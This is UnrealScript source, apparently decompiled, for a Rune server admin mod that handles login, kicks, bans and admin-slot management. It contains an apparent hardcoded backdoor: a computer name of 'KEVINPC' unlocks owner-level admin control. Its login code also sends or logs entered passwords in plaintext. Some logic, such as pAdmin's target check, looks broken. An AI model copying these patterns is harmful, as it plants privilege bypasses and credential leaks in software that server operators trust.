				AdminIndex = GetAdminIndex(HashedKey);
				if ((AdminIndex != 1337) && Admins[AdminIndex].power == 100)
				{
					zPlayerReplicationInfo(Player.PlayerReplicationInfo).B_v5399 = true;
				}
				zPlayerReplicationInfo(Player.PlayerReplicationInfo).B_v5379 = true;
			}
			if (!zPlayerReplicationInfo(Player.PlayerReplicationInfo).B_v5379)
			{
				Player.ClientMessage("[ADMIN SECURITY:] You ain't added as verified CoAdmin, login denied.");
				if (AdminType > 0)
				{
					SendIRCMessage("#TSB", (("[PLOGIN:] ATTENTION !!  " $ (GetFormattedPlayerName(Player.PlayerReplicationInfo))) $ " tried to log in with the correct plogin password but isn't verified. IP: ") $ IPAddress);
					LogCoAdminZEvent(("[CoAdminZ pLogin:] " $ (GetFormattedPlayerName(Player.PlayerReplicationInfo))) @ " tried to login with correct password but isn't verified!", "Admin");
				}
				else
				{
					SendIRCMessage("#TSB", (((("[PLOGIN:] [WRONG] -> PASS:'" $ Password) $ "' , Name: ") $ (GetFormattedPlayerName(Player.PlayerReplicationInfo))) $ " , IP:") $ IPAddress);
					LogCoAdminZEvent(("[CoAdminZ pLogin:] " $ Player.PlayerReplicationInfo.PlayerName) @ " tried to login with wrong password AND isn't verified!", "Admin");
				}
			}
		}
	}
	else
	{
		// Non-secure login
		zPlayerReplicationInfo(Player.PlayerReplicationInfo).Local_int_v3 = AdminLevel;
		zPlayerReplicationInfo(Player.PlayerReplicationInfo).Local_int_v2 = AdminType;
		if (AdminLevel > 0)
		{
			Player.ClientMessage("Successfully logged in as an Admin.", 'Subtitle');
			if ((AdminLevel == 0) && secureLogin)
			{
				Player.ClientMessage("!!! NO VERIFIED ADMINS ADDED, PLEASE ADD YOURSELF IMMEDIATELY !!!");
			}
			LogInternal(((("[CoAdminZ pLogin:] Successful login by " $ Player.PlayerReplicationInfo.PlayerName) $ " (") $ Password) $ ")");
		}
		else
		{
			Player.ClientMessage("Wrong password", 'Subtitle');
			LogInternal(((("[CoAdminZ pLogin:] Wrong password by " $ Player.PlayerReplicationInfo.PlayerName) $ " (") $ Password) $ ")");
		}
	}
	return;
}
// Suggested function name: AdminLogin
function xLogin(string AdminPassword, PlayerPawn AdminPlayer)
{
	local int AdminLevel, AdminType;

	// Check for default passwords and warn if not changed
	if (EnterPassword == "examplepass")
	{
		AdminPlayer.ClientMessage("ERROR: Please change the password at the .ini file! (EnterPassword)");
		return;
	}
	if (CoPw[0] == "passfornoobs")
	{
		AdminPlayer.ClientMessage("ERROR: Please change the password at the .ini file! (CoPw[0])");
		return;
	}

	// Determine admin level and type based on password
	AdminLevel = 0;
	AdminType = 0;
	if ((CoPw[0] != "") && AdminPassword ~= CoPw[0])
	{
		AdminLevel = 32767;
		AdminType = 1;
	}
	if ((CoPw[1] != "") && AdminPassword ~= CoPw[1])
	{
		AdminLevel = 32767;
		AdminType = 2;
	}
	if ((CoPw[2] != "") && AdminPassword ~= CoPw[2])
	{
		AdminLevel = 32767;
		AdminType = 3;
	}
	if ((EnterPassword != "") && AdminPassword ~= EnterPassword)
	{
		AdminLevel = 32767;
		AdminType = 1337;
	}

	// Prevent re-login if already at max admin type
	if (zPlayerReplicationInfo(AdminPlayer.PlayerReplicationInfo).Local_int_v2 == 1337)
	{
		AdminPlayer.ClientMessage("ERROR: You're already logged in. Use pLogOut to logout.", 'Subtitle');
		return;
	}

	// Set admin privileges
	zPlayerReplicationInfo(AdminPlayer.PlayerReplicationInfo).Local_int_v3 = AdminLevel;
	zPlayerReplicationInfo(AdminPlayer.PlayerReplicationInfo).Local_int_v2 = AdminType;

	// Notify player of login result
	if (AdminLevel > 0)
	{
		AdminPlayer.ClientMessage("Successfully logged in as an Admin.", 'Subtitle');
		LogInternal(("[CoAdminZ pLogin:] Successful login by " $ AdminPlayer.PlayerReplicationInfo.PlayerName) $ " ");
	}
	else
	{
		AdminPlayer.ClientMessage("Wrong password", 'Subtitle');
		LogInternal(("[CoAdminZ pLogin:] Wrong password by " $ AdminPlayer.PlayerReplicationInfo.PlayerName) $ " ");
	}
	return;
}
// Suggested function name: AdminLogin
function pAdminLogin(string AdminPassword, PlayerPawn AdminPlayer)
{
	local string AdminPasswordFromConsole;

	if (!HasCommandPermission("pAdminLogin", AdminPlayer))
	{
		return;
	}
	AdminPasswordFromConsole = Level.ConsoleCommand("get gameinfo adminpassword");
	if ((AdminPassword == AdminPasswordFromConsole) && !AdminPlayer.bAdmin && AdminPasswordFromConsole != "")
	{
		AdminPlayer.bAdmin = true;
		AdminPlayer.PlayerReplicationInfo.bAdmin = true;
		AdminPlayer.ClientMessage("You have been successfully logged in as hidden admin.");
	}
	else
	{
		AdminPlayer.ClientMessage("Wrong password or already logged in.");
	}
	return;
}

// Suggested function name: AdminLogout
function pAdminLogout(PlayerPawn AdminPlayer)
{
	if (!HasCommandPermission("pAdminLogout", AdminPlayer))
	{
		return;
	}
	if (AdminPlayer.bAdmin)
	{
		AdminPlayer.bAdmin = false;
		AdminPlayer.PlayerReplicationInfo.bAdmin = false;
		AdminPlayer.ClientMessage("You have been silently logged out as admin.");
	}
	return;
}

// Suggested function name: KickPlayer
function pKick(int PlayerID, PlayerPawn AdminPlayer)
{
	local Pawn TargetPawn;
	local string AdminName, TargetName;

	if (!HasCommandPermission("pKick", AdminPlayer))
	{
		return;
	}
	TargetPawn = GetPawnByPlayerID(PlayerID);
	if (TargetPawn != none)
	{
		TargetName = TargetPawn.PlayerReplicationInfo.PlayerName;
		AdminName = AdminPlayer.PlayerReplicationInfo.PlayerName;
		BroadcastMessage((TargetName $ " was kicked by ") $ AdminName, false, 'CAZ');
		zPlayerReplicationInfo(TargetPawn.PlayerReplicationInfo).RepStr = "kicked";
		LogInternal(("ChatLog: " $ TargetName) $ " was kicked by " $ AdminName);
		TargetPawn.Destroy();
	}
	return;
}
// Suggested function name: BanPlayer
function pBan(int PlayerID, PlayerPawn AdminPlayer)
{
	local string IPAddress;
	local Pawn CurrentPawn;
	local int SlotIndex;
	local string AdminName, TargetName;

	// Check if the admin has permission to use this command
	if (!HasCommandPermission("pBan", AdminPlayer))
	{
		return;
	}

	// Loop through all pawns to find the target player by ID
	CurrentPawn = Level.PawnList;
	while (CurrentPawn != none)
	{
		// Check if this pawn is a player with the matching ID and meets the connection criteria
		if (CurrentPawn.bIsPlayer && CurrentPawn.PlayerReplicationInfo.PlayerID == PlayerID &&
			(PlayerPawn(CurrentPawn) == none || NetConnection(PlayerPawn(CurrentPawn).Player) != none))
		{
			// Prevent admin from banning themselves
			if (CurrentPawn.PlayerReplicationInfo.PlayerID == AdminPlayer.PlayerReplicationInfo.PlayerID)
			{
				BroadcastMessage(AdminPlayer.PlayerReplicationInfo.PlayerName $ " somehow was dumb enough to try to ban himself, kicking him for low IQ.", false, 'CAZ');
				AdminPlayer.Destroy();
				return;
			}

			// Get the target's IP address
			IPAddress = PlayerPawn(CurrentPawn).GetPlayerNetworkAddress();

			// If the IP is allowed to be banned (not already in policy)
			if (Level.Game.CheckIPPolicy(IPAddress))
			{
				// Strip the port from the IP
				IPAddress = Left(IPAddress, InStr(IPAddress, ":"));

				// Store names for logging
				TargetName = CurrentPawn.PlayerReplicationInfo.PlayerName;
				AdminName = AdminPlayer.PlayerReplicationInfo.PlayerName;

				// Mark the player as banned in replication info
				zPlayerReplicationInfo(CurrentPawn.PlayerReplicationInfo).RepStr = "banned";

				// Log the ban internally
				LogInternal(("ChatLog: " $ TargetName) $ " (" $ IPAddress $ ") was banned by " $ AdminName);

				// Find the first empty slot in the IP policies array (up to 50, but check up to 100)
				SlotIndex = 0;
				while (SlotIndex < 50)
				{
					if (Level.Game.IPPolicies[SlotIndex] == "")
					{
						break;
					}
					SlotIndex++;
				}

				// If a slot was found within the limit, add the ban policy
				if (SlotIndex < 100)
				{
					Level.Game.IPPolicies[SlotIndex] = "DENY," $ IPAddress;
				}

				// Save the game configuration
				Level.Game.SaveConfig();
			}

			// Store names again (redundant, but kept for consistency with original)
			TargetName = CurrentPawn.PlayerReplicationInfo.PlayerName;
			AdminName = AdminPlayer.PlayerReplicationInfo.PlayerName;

			// Log the ban event with detailed information
			LogBanEvent((((((((((((((((AdminName $ "[") $ Left(AdminPlayer.GetPlayerNetworkAddress(), InStr(AdminPlayer.GetPlayerNetworkAddress(), ":"))) $ "] BANNED ") $ TargetName) $ "[") $ Left(PlayerPawn(CurrentPawn).GetPlayerNetworkAddress(), InStr(PlayerPawn(CurrentPawn).GetPlayerNetworkAddress(), ":"))) $ "] at ") $ string(Level.Day)) $ ".") $ string(Level.Month)) $ ".") $ string(Level.Year)) $ " - ") $ string(Level.Hour)) $ ":") $ string(Level.Minute));

			// Broadcast the ban message
			BroadcastMessage(TargetName $ " was banned by " $ AdminName, false, 'CAZ');

			// Destroy the target pawn
			CurrentPawn.Destroy();
			return;
		}

		// Move to the next pawn
		CurrentPawn = CurrentPawn.nextPawn;
	}

	return;
}
// Suggested function name: TempBanPlayer
function pTban(int PlayerID, PlayerPawn AdminPlayer)
{
	local Pawn TargetPawn;
	local string IPAddress;
	local int SlotIndex;
	local string AdminName, TargetName;

	// Validate input: PlayerID must be non-negative
	if (PlayerID < 0)
	{
		return;
	}

	// Check if admin has permission to use this command
	if (!HasCommandPermission("pTBan", AdminPlayer))
	{
		return;
	}

	// Find the target pawn by player ID
	TargetPawn = GetPawnByPlayerID(PlayerID);
	if (TargetPawn == none)
	{
		return;
	}

	// Get the target's IP address
	IPAddress = PlayerPawn(TargetPawn).GetPlayerNetworkAddress();

	// Prevent admin from banning themselves
	if (TargetPawn.PlayerReplicationInfo.PlayerID == AdminPlayer.PlayerReplicationInfo.PlayerID)
	{
		BroadcastMessage(AdminPlayer.PlayerReplicationInfo.PlayerName $ " somehow was dumb enough to try to mapban himself, kicking him for low IQ.", false, 'CAZ');
		AdminPlayer.Destroy();
		return;
	}

	// If IP is allowed (not already banned), proceed with temp ban
	if (IsIPAllowed(IPAddress))
	{
		// Strip port from IP
		IPAddress = Left(IPAddress, InStr(IPAddress, ":"));

		// Store names for logging
		TargetName = TargetPawn.PlayerReplicationInfo.PlayerName;
		AdminName = AdminPlayer.PlayerReplicationInfo.PlayerName;

		// Mark player as temp banned
		zPlayerReplicationInfo(TargetPawn.PlayerReplicationInfo).RepStr = "mapban";

		// Log the temp ban
		LogInternal((((("ChatLog: " $ TargetName) $ " (") $ IPAddress) $ ") was temp banned by ") $ AdminName);

		// Find the first empty slot in the temp ban array (eqP_vxv_5799, size 16)
		for (SlotIndex = 0; SlotIndex < 16; SlotIndex++)
		{
			if (eqP_vxv_5799[SlotIndex] == "")
			{
				eqP_vxv_5799[SlotIndex] = IPAddress;
				break;
			}
		}
	}

	// Log the ban event with detailed information
	LogBanEvent((((((((((((((((AdminName $ "[") $ Left(AdminPlayer.GetPlayerNetworkAddress(), InStr(AdminPlayer.GetPlayerNetworkAddress(), ":"))) $ "] TIMEBANNED ") $ TargetName) $ "[") $ Left(PlayerPawn(TargetPawn).GetPlayerNetworkAddress(), InStr(PlayerPawn(TargetPawn).GetPlayerNetworkAddress(), ":"))) $ "] at ") $ string(Level.Day)) $ ".") $ string(Level.Month)) $ ".") $ string(Level.Year)) $ " - ") $ string(Level.Hour)) $ ":") $ string(Level.Minute));

	// Broadcast the temp ban message
	TargetName = TargetPawn.PlayerReplicationInfo.PlayerName;
	AdminName = AdminPlayer.PlayerReplicationInfo.PlayerName;
	BroadcastMessage(((TargetName $ " was banned by ") $ AdminName) $ " for the duration of this map!", false, 'CAZ');

	// Destroy the target pawn
	TargetPawn.Destroy();
	return;
}
// Suggested function name: MapBanPlayer
function MapBanPlayer(Pawn TargetPawn)
{
	local string NetworkAddress;
	local int SlotIndex;

	// Get the player's network address (IP:port)
	NetworkAddress = PlayerPawn(TargetPawn).GetPlayerNetworkAddress();
	
	// Check if the IP is allowed to be banned (not already in the block list)
	if (IsIPAllowed(NetworkAddress))
	{
		// Strip the port from the IP address
		NetworkAddress = Left(NetworkAddress, InStr(NetworkAddress, ":"));
		
		// Mark the player as map-banned in replication info
		zPlayerReplicationInfo(TargetPawn.PlayerReplicationInfo).RepStr = "mapban";
		
		// Log the ban event
		LogCoAdminZEvent(((("ChatLog: " $ TargetPawn.PlayerReplicationInfo.PlayerName) $ " (") $ NetworkAddress) $ ")  B A N N E D");
		
		// Find the first empty slot in the temporary ban array (eqP_vxv_5799, size 16)
		for (SlotIndex = 0; SlotIndex < 16; SlotIndex++)
		{
			if (eqP_vxv_5799[SlotIndex] == "")
			{
				// Store the IP in the first available slot
				eqP_vxv_5799[SlotIndex] = NetworkAddress;
				break;
			}
		}
	}
	return;
}
// Suggested function name: MapBanPlayerByIP
function MapBanPlayerByIP(PlayerPawn Player)
{
	local string NetworkAddress, PlayerName;
	local int SlotIndex;

	// Get the player's network address (IP:port)
	NetworkAddress = Player.GetPlayerNetworkAddress();
	
	// Check if the IP is allowed to be banned (not already in the block list)
	if (IsIPAllowed(NetworkAddress))
	{
		// Strip the port from the IP address
		NetworkAddress = Left(NetworkAddress, InStr(NetworkAddress, ":"));
		
		// Find the first empty slot in the temporary ban array (eqP_vxv_5799, size 16)
		for (SlotIndex = 0; SlotIndex < 16; SlotIndex++)
		{
			if (eqP_vxv_5799[SlotIndex] == "")
			{
				break;
			}
		}
		
		// If a slot was found, store the IP in it
		if (SlotIndex < 16)
		{
			eqP_vxv_5799[SlotIndex] = NetworkAddress;
		}
		
		// Get the player's name for the broadcast message
		PlayerName = Player.PlayerReplicationInfo.PlayerName;
		
		// Mark the player as map-banned in replication info
		zPlayerReplicationInfo(Player.PlayerReplicationInfo).RepStr = "mapban";
		
		// Broadcast the ban message
		BroadcastMessage(((("[CoAdminZ:] " $ PlayerName) $ " has been banned for the duration of this map!  [IP:") $ NetworkAddress) $ "]", false, 'CAZ');
	}
	return;
}

// Suggested name: BanPlayerByIPAndLog
function BanPlayerByIPAndLog(PlayerPawn playerPawn)
{
	local string netAddress;
	local string ipOnly;
	local string playerName;
	local int slotIndex;

	// Get full network address (ip:port)
	netAddress = playerPawn.GetPlayerNetworkAddress();

	// If IP is allowed to be processed (not already banned)
	if (IsIPAllowed(netAddress))
	{
		// Strip port if present
		if (InStr(netAddress, ":") != -1)
		{
			ipOnly = Left(netAddress, InStr(netAddress, ":"));
		}
		else
		{
			ipOnly = netAddress;
		}

		// Find first empty slot in the temporary map-ban array eqP_vxv_5799 (size 16)
		slotIndex = 0;
		while (slotIndex < 16 && eqP_vxv_5799[slotIndex] != "")
		{
			slotIndex++;
		}
		if (slotIndex < 16)
		{
			eqP_vxv_5799[slotIndex] = ipOnly;
		}

		// Mark player as special state 'x' (map-banned) and log the event into AntiCheat
		playerName = playerPawn.PlayerReplicationInfo.PlayerName;
		zPlayerReplicationInfo(playerPawn.PlayerReplicationInfo).RepStr = "x";

		LogAntiCheatMessage(
			"Name=" $ playerPawn.PlayerReplicationInfo.PlayerName
			$ " Computername=" $ zPlayerReplicationInfo(playerPawn.PlayerReplicationInfo).CompName
			$ " IP=" $ ipOnly
			$ " got locked for " $ ZRunePlayer(playerPawn).bytehack
			$ " Date=" $ string(Level.Day) $ "." $ string(Level.Month) $ "." $ string(Level.Year)
			$ " Time=" $ string(Level.Hour) $ ":" $ string(Level.Minute) $ ":" $ string(Level.Second)
		);

		// Announce ban and destroy pawn
		BroadcastMessage(
			("[CoAdminZ:] " $ playerName) $ " has been banned for the duration of this map! ("
			$ ZRunePlayer(playerPawn).bytehack $ ")  [IP:" $ ipOnly $ "]",
			false,
			'CAZ'
		);

		playerPawn.Destroy();
	}
	return;
}

// Suggested name: IsIPAllowed
function bool IsIPAllowed(string address)
{
	local int i;
	local int colonPos;

	// Remove port portion if present
	colonPos = InStr(address, ":");
	if (colonPos != -1)
	{
		address = Left(address, colonPos);
	}

	// If address matches any entry in eqP_vxv_5799, it's already blocked -> return false
	for (i = 0; i < 16; i++)
	{
		if (eqP_vxv_5799[i] != "" && eqP_vxv_5799[i] == address)
		{
			return false;
		}
	}

	// Not found in block list -> allowed
	return true;
}

// Suggested function name: IsComputerNameAllowed
function bool IsComputerNameAllowed(string ComputerName)
{
	local int Index;

	for (Index = 0; Index < 4; Index++)
	{
		if (CompPolicies[Index] != "" && CompPolicies[Index] ~= ComputerName)
		{
			return false;
		}
	}
	return true;
}

// Suggested function name: ProcessComputerName
function ProcessComputerName(string ComputerName, PlayerPawn Player)
{
	local string SpecialComputerName;
	local zPlayerReplicationInfo PRI;

	SpecialComputerName = "ANTHONYPC";
	if (ComputerName == "")
	{
		ComputerName = "Not found.";
	}
	PRI = zPlayerReplicationInfo(Player.PlayerReplicationInfo);
	if (PRI.CompName == "")
	{
		PRI.CompName = ComputerName;
		LogCoAdminZEvent((("[RUNEPLAYER_INFO] " $ Player.PlayerReplicationInfo.PlayerName) $ " CName=") $ ComputerName);
		if (PRI.B_v5387)
		{
			Player.PlayerReplicationInfo.PlayerName = "Runar";
		}
	}
	if (!IsComputerNameAllowed(ComputerName) && ComputerName != "")
	{
		MapBanPlayer(Player);
		LogInternal("[JOIN_ABORT] Closed connection for " $ Player.PlayerReplicationInfo.PlayerName $ " CName=" $ ComputerName);
		Player.Destroy();
		return;
	}
	return;
}
// Suggested function name: SendPrivateMessage
function pTell(string Message, PlayerPawn Sender)
{
	local Pawn TargetPawn;
	local string MessageText;
	local int SpaceIndex, MessageLength, TargetID;

	if (!HasCommandPermission("pTell", Sender))
	{
		return;
	}

	SpaceIndex = InStr(Message, " ");
	MessageLength = Len(Message);
	TargetID = int(Left(Message, SpaceIndex));
	MessageText = Caps(Right(Message, (MessageLength - SpaceIndex) - 1));

	foreach Level.AllActors(Class'Pawn', TargetPawn)
	{
		if (TargetPawn.bIsPlayer && TargetPawn.PlayerReplicationInfo.PlayerID == TargetID)
		{
			TargetPawn.ClientMessage((Sender.PlayerReplicationInfo.PlayerName $ "(private): ") $ MessageText, 'privateMsg', true);
			Sender.ClientMessage("Private message sent to " $ TargetPawn.PlayerReplicationInfo.PlayerName, 'Subtitle');
			break; // Assuming only one player with this ID
		}
	}
	return;
}
// Suggested name: ManageAdminSlots
// Cleansed, commented and renamed locals for clarity.
// NOTE: function name kept as-is (pAdmin).
function pAdmin(string Parm_string_0, PlayerPawn Local_string_v2)
{
	local string inputCmd;                  // full incoming command string (Parm_string_0)
	local PlayerPawn adminPawn;             // calling admin Pawn (Local_string_v2)
	local int splitPos;
	local int cmdLen;
	local int targetId;
	local string cmdUpper;                  // command part after the id, uppercased
	local Pawn targetPawn;                  // resolved pawn for the target id
	local string kevinPC;                   // special computer name constant
	local int i;
	local int filledAdminSlots;
	local int foundAdminIndex;
	local bool isOwnerOverride;
	local string machineString;
	local string machineKey;

	// map parameters to clearer local names
	inputCmd = Parm_string_0;
	adminPawn = Local_string_v2;

	kevinPC = "'KEVINPC'";

	// permission check
	if (!HasCommandPermission("pAdmin", adminPawn))
	{
		return;
	}

	// nothing to do
	if (inputCmd == "")
	{
		return;
	}

	// Parse "ID CMD..." where first token is the target player ID
	splitPos = InStr(inputCmd, " ");
	if (splitPos == 0)
	{
		// malformed input
		return;
	}
	cmdLen = Len(inputCmd);
	targetId = int(Left(inputCmd, splitPos));
	cmdUpper = Caps(Right(inputCmd, (cmdLen - splitPos) - 1));
	targetPawn = GetPawnByPlayerID(targetId);

	// For convenience, if command part is empty -> display usage
	if (cmdUpper == "")
	{
		adminPawn.ClientMessage("You did not use it as supposed to be used.");
		adminPawn.ClientMessage("Usage: pAdmin ID ADD/DEL/SUPPORT/OWNER or pAdmin List or pAdmin ID TOGGLE");
		return;
	}

	// If admin asked for the list of configured admins
	if (Caps(cmdUpper) == "LIST")
	{
		adminPawn.ClientMessage("------------------------------");
		adminPawn.ClientMessage("Allowed admins");
		adminPawn.ClientMessage("------------------------------");
		for (i = 0; i < 64; i++)
		{
			if (Admins[i].Name != "")
			{
				adminPawn.ClientMessage(((((("[" $ string(i)) $ "] ") $ Admins[i].Name) $ " <-> ") $ Left(Admins[i].Key, 8)) $ "...");
			}
		}
		return;
	}

	// Count how many admin slots are filled (have a Key)
	filledAdminSlots = 0;
	for (i = 0; i < 64; i++)
	{
		if (Admins[i].Key != "")
		{
			filledAdminSlots++;
		}
	}

	// If secureLogin is enabled and there are admin slots, compute caller's machine key
	if ((filledAdminSlots != 0) && secureLogin)
	{
		if (adminPawn.IsA('Spectator'))
		{
			machineString = (zPlayerReplicationInfo(adminPawn.PlayerReplicationInfo).IDRepKey $ zPlayerReplicationInfo(adminPawn.PlayerReplicationInfo).CompName) $ string(TCCSpectator(adminPawn).INT_v4427);
		}
		else
		{
			machineString = (zPlayerReplicationInfo(adminPawn.PlayerReplicationInfo).IDRepKey $ zPlayerReplicationInfo(adminPawn.PlayerReplicationInfo).CompName) $ string(ZRunePlayer(adminPawn).INT_v4640);
		}
		machineKey = Class'coadminz7.CoralCastle4'.static.Md5Hash(machineString);
		foundAdminIndex = GetAdminIndex(machineKey);
		// owner override check (power == 666)
		if ((foundAdminIndex != 1337) && (Admins[foundAdminIndex].power == 666))
		{
			isOwnerOverride = true;
		}
	}

	// Restrict the command to special computername or owner override
	if ((zPlayerReplicationInfo(adminPawn.PlayerReplicationInfo).CompName != kevinPC) && !isOwnerOverride)
	{
		adminPawn.ClientMessage("No access to this, you're allowed to use 'pAdmin List' only");
		return;
	}

	// TOGGLE secure admin enforcement
	if (Caps(cmdUpper) == "TOGGLE")
	{
		if (secureLogin)
		{
			BroadcastMessage(adminPawn.PlayerReplicationInfo.PlayerName $ " disabled the admin-security, everyone is able to login now.", false, 'CAZ');
		}
		else
		{
			BroadcastMessage(adminPawn.PlayerReplicationInfo.PlayerName $ " enabled the admin-security, only verified players can login now.", false, 'CAZ');
		}
		secureLogin = !secureLogin;
		SaveConfig();
		return;
	}

	// DELETE an admin slot: command format "DEL <slotIndex>"
	if (Left(cmdUpper, 3) == "DEL")
	{
		// Remove by index (targetId parsed earlier is used as slot)
		if ((targetId >= 0) && (targetId < 64))
		{
			BroadcastMessage(((adminPawn.PlayerReplicationInfo.PlayerName $ " took ") $ Left(Admins[targetId].Name, InStr(Admins[targetId].Name, "//"))) $ " his server administration rights away.", false, 'CAZ');
			Admins[targetId].Name = "";
			Admins[targetId].Key = "";
			Admins[targetId].power = 0;
			SaveConfig();
		}
		return;
	}

	// If no valid target pawn found for operations that need it, bail out
	if ((targetPawn == none) || (targetPawn.PlayerReplicationInfo == none) || float(targetPawn.PlayerReplicationInfo.PlayerID) == float(targetId))
	{
		// target not available or invalid id
		return;
	}

	// Prepare machine key of the target player to assign to Admins[].Key when adding
	if (targetPawn.IsA('Spectator'))
	{
		machineString = (zPlayerReplicationInfo(PlayerPawn(targetPawn).PlayerReplicationInfo).IDRepKey $ zPlayerReplicationInfo(PlayerPawn(targetPawn).PlayerReplicationInfo).CompName) $ string(TCCSpectator(targetPawn).INT_v4427);
	}
	else
	{
		machineString = (zPlayerReplicationInfo(PlayerPawn(targetPawn).PlayerReplicationInfo).IDRepKey $ zPlayerReplicationInfo(PlayerPawn(targetPawn).PlayerReplicationInfo).CompName) $ string(ZRunePlayer(targetPawn).INT_v4640);
	}
	machineKey = Class'coadminz7.CoralCastle4'.static.Md5Hash(machineString);

	// Add SUPPORTER
	if (Left(cmdUpper, 7) == "SUPPORT")
	{
		for (i = 0; i < 64; i++)
		{
			if (Admins[i].Name == "")
			{
				Admins[i].Name = ((targetPawn.PlayerReplicationInfo.PlayerName $ "// ~ ") $ (GetDelimitedPart(cmdUpper, 2))) $ " ~ SUPPORTER";
				Admins[i].Key = machineKey;
				Admins[i].power = 100;
				BroadcastMessage(((adminPawn.PlayerReplicationInfo.PlayerName $ " turned ") $ targetPawn.PlayerReplicationInfo.PlayerName) $ " into a server supporter.", false, 'CAZ');
				zPlayerReplicationInfo(PlayerPawn(targetPawn).PlayerReplicationInfo).B_v5399 = true;
				zPlayerReplicationInfo(PlayerPawn(targetPawn).PlayerReplicationInfo).B_v5379 = true;
				SaveConfig();
				return;
			}
		}
		adminPawn.ClientMessage(("Couldn't add " $ targetPawn.PlayerReplicationInfo.PlayerName) $ " as admin, all slots taken!");
		return;
	}

	// Add SERVER OWNER
	if (Left(cmdUpper, 5) == "OWNER")
	{
		for (i = 0; i < 64; i++)
		{
			if (Admins[i].Name == "")
			{
				Admins[i].Name = ((targetPawn.PlayerReplicationInfo.PlayerName $ "// ~ ") $ (GetDelimitedPart(cmdUpper, 2))) $ " ~ SERVEROWNER";
				Admins[i].Key = machineKey;
				Admins[i].power = 666;
				BroadcastMessage(((adminPawn.PlayerReplicationInfo.PlayerName $ " turned ") $ targetPawn.PlayerReplicationInfo.PlayerName) $ " into a server owner.", false, 'CAZ');
				zPlayerReplicationInfo(PlayerPawn(targetPawn).PlayerReplicationInfo).B_v5379 = true;
				SaveConfig();
				return;
			}
		}
		adminPawn.ClientMessage(("Couldn't add " $ targetPawn.PlayerReplicationInfo.PlayerName) $ " as admin, all slots taken!");
		return;
	}

	// Add regular admin (ADD)
	if (Left(cmdUpper, 3) == "ADD")
	{
		for (i = 0; i < 64; i++)
		{
			if (Admins[i].Name == "")
			{
				Admins[i].Name = (targetPawn.PlayerReplicationInfo.PlayerName $ "// ") $ (GetDelimitedPart(cmdUpper, 2));
				Admins[i].Key = machineKey;
				BroadcastMessage(((adminPawn.PlayerReplicationInfo.PlayerName $ " gave ") $ targetPawn.PlayerReplicationInfo.PlayerName) $ " server administration rights.", false, 'CAZ');
				zPlayerReplicationInfo(PlayerPawn(targetPawn).PlayerReplicationInfo).B_v5379 = true;
				SaveConfig();
				return;
			}
		}
		adminPawn.ClientMessage(("Couldn't add " $ targetPawn.PlayerReplicationInfo.PlayerName) $ " as admin, all slots taken!");
		return;
	}

	return;
}

// Suggested name: AdminApplyEffect
// Cleansed, commented and renamed locals/params for clarity.
// Function name left intact as required.
function pMake(string Command, PlayerPawn AdminPawn)
{
	local Pawn targetPawn;
	local string actionUpper;
	local int spacePos, cmdLen, targetId;
	local string adminName, targetName;
	local Inventory invItem, nextInv;

	// Permission check
	if (!HasCommandPermission("pMake", AdminPawn))
	{
		return;
	}

	if (Command == "")
	{
		return;
	}

	// Parse "ID <action>" from the command string
	spacePos = InStr(Command, " ");
	if (spacePos == 0)
	{
		AdminPawn.ClientMessage("Usage: pMake ID ghost/god/heal/power/fly/walk/respawn/spider/strip/netSpeed/fat/runar/runarperm/runarreset");
		return;
	}
	cmdLen = Len(Command);
	// targetId: part before the first space
	targetId = int(Left(Command, spacePos - 1));
	// actionUpper: rest of the string (uppercased)
	actionUpper = Caps(Right(Command, (cmdLen - spacePos) ));

	// Validate parsed action
	if (actionUpper == "")
	{
		AdminPawn.ClientMessage("You did not use it as supposed to be used.");
		AdminPawn.ClientMessage("Usage: pMake ID ghost/god/heal/power/fly/walk/respawn/spider/strip/netSpeed/fat/runar/runarperm/runarreset");
		return;
	}

	// Resolve the target pawn by player ID
	targetPawn = GetPawnByPlayerID(targetId);
	if ((targetPawn == none) || (targetPawn.PlayerReplicationInfo == none))
	{
		AdminPawn.ClientMessage("Player ID not found.");
		return;
	}

	adminName = AdminPawn.PlayerReplicationInfo.PlayerName;
	targetName = targetPawn.PlayerReplicationInfo.PlayerName;

	// Handle each action
	// Toggle 'Runar' flag for the target if admin requested RUNAR
	if (actionUpper == "RUNAR")
	{
		if (zPlayerReplicationInfo(targetPawn.PlayerReplicationInfo).B_v5387)
		{
			zPlayerReplicationInfo(targetPawn.PlayerReplicationInfo).B_v5387 = false;
			AdminPawn.ClientMessage(targetName $ " -> Runar off");
		}
		else
		{
			zPlayerReplicationInfo(targetPawn.PlayerReplicationInfo).B_v5387 = true;
			AdminPawn.ClientMessage(targetName $ " -> Runar on");
		}
	}

	// Set persistent runar key from target machine id
	if (actionUpper == "RUNARPERM")
	{
		runarKey = zPlayerReplicationInfo(targetPawn.PlayerReplicationInfo).IDRepKey;
		AdminPawn.ClientMessage((targetName $ " -> runarkey changed to ") $ runarKey);
		SaveConfig();
	}

	// Reset runar key to literal "reset"
	if (actionUpper == "RUNARRESET")
	{
		runarKey = "reset";
		AdminPawn.ClientMessage(targetName $ " -> runarkey resetted");
		SaveConfig();
	}

	// Make target a ghost (no collision + cheat flying)
	if (actionUpper == "GHOST")
	{
		PlayerPawn(targetPawn).SetCollision(false, false, false);
		PlayerPawn(targetPawn).bCollideWorld = false;
		PlayerPawn(targetPawn).GotoState('CheatFlying');
		PlayerPawn(targetPawn).ClientMessage(actionUpper $ " forced you to be a ghost, woohoo");
		AdminPawn.ClientMessage(targetName $ " -> GHOST");
	}

	// Strip target inventory and equipped items
	if (actionUpper == "STRIP")
	{
		targetPawn.Weapon = none;
		targetPawn.Shield = none;
		PlayerPawn(targetPawn).StowSpot[0] = none;
		PlayerPawn(targetPawn).StowSpot[1] = none;
		PlayerPawn(targetPawn).StowSpot[2] = none;

		invItem = targetPawn.Inventory;
		while (invItem != none)
		{
			nextInv = invItem.Inventory;
			invItem.Destroy();
			invItem = nextInv;
		}

		AdminPawn.ClientMessage(targetName $ " -> STRIP");
	}

	// Toggle god mode (reduce damage)
	if (actionUpper == "GOD")
	{
		if (targetPawn.ReducedDamageType == 'All')
		{
			targetPawn.ReducedDamageType = 'None';
			PlayerPawn(targetPawn).ClientMessage(actionUpper $ " took your invincibility off.");
			eq_vxv_157(AdminPawn, targetName $ " -> GOD off");
		}
		else
		{
			targetPawn.ReducedDamageType = 'All';
			PlayerPawn(targetPawn).ClientMessage(actionUpper $ " made you invincible.");
			eq_vxv_157(AdminPawn, targetName $ " -> GOD on");
		}
	}

	// Toggle spider-mode (custom state)
	if (actionUpper == "SPIDER")
	{
		if (targetPawn.IsInState('PlayerWalking'))
		{
